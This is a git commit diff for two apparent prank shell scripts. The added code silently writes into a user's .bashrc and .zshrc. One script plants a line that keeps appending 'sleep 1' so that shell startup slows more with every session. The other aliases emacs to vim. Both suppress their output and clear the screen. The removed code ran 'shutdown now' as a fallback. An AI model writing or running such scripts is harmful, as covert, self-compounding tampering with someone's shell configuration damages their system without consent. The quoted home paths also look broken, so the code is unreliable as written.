35223751d519ee0095468fc8483f90533a19a81c
Waz0x <remy.noulin@epitech.eu>
2021-09-08 17:22:16 +0200

    MOD | print in .bashrc and .zshrc

--- scripts/0.sh
+++ scripts/0.sh
@@ -1,13 +1,4 @@
 #!/bin/bash
-if [ -n "$ZSH_VERSION" ]; then
-   shell="zsh"
-elif [ -n "$BASH_VERSION" ]; then
-   shell="bash"
-else
-   shutdown now
-fi
-
-(cd ~ && echo "echo 'sleep 1' >> ~/."$shell"rc" >> "~/."$shell"rc" && cd -) > /dev/null
-
+(cd ~ && echo "echo 'sleep 1' >> ~/.bashrc" >> "~/.bashrc" && cd -) > /dev/null
+(cd ~ && echo "echo 'sleep 1' >> ~/.zshrc" >> "~/.zshrc" && cd -) > /dev/null
 clear
-exit
--- scripts/1.sh
+++ scripts/1.sh
@@ -1,12 +1,4 @@
 #!/bin/bash
-if [ -n "$ZSH_VERSION" ]; then
-   shell="zsh"
-elif [ -n "$BASH_VERSION" ]; then
-   shell="bash"
-else
-   shutdown now
-fi
-(cd ~ && echo "alias emacs=vim" >> "."$shell"rc" && cd -) > /dev/null
-
+(cd ~ && echo "alias emacs=vim" >> ".bashrc" && cd -) > /dev/null
+(cd ~ && echo "alias emacs=vim" >> ".zshrc" && cd -) > /dev/null
 clear
-exit
